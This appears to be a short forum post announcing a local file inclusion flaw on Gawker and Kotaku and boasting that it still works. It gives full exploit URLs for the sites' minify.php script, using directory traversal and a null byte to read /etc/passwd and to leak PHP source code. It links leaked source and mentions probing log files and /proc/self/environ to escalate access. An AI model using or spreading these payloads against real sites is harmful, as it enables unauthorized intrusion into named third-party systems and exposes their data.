Thought I'd share this...found an LFI on gawker which is on the
same server as Kotaku and other sites part of their 'network'

http://kotaku.com/assets/minify.php?fsid=dfdsf&type=sads&sb=../../..
/../../../../../../../etc/passwd%00

^ works for gawker as well, just replace the name

Full source code of the offending page http://pastebin.com/eWuExuke

newline characters are stripped out however...

This was the original 'LFI' I used to get the source code
http://gawker.com/assets/minify.php?base=/assets/base.v9/css/../../l
ib/jsmin.php%00&files=asfdf.css

It seems to be fixed today though. But the other LFI above still
works :D

AFAIK it's not exploitable beyond the obvious information
disclosures, as they don't allow read access to logfiles, and
/proc/self/environ is unreadable. Still amusing to find this on
there.
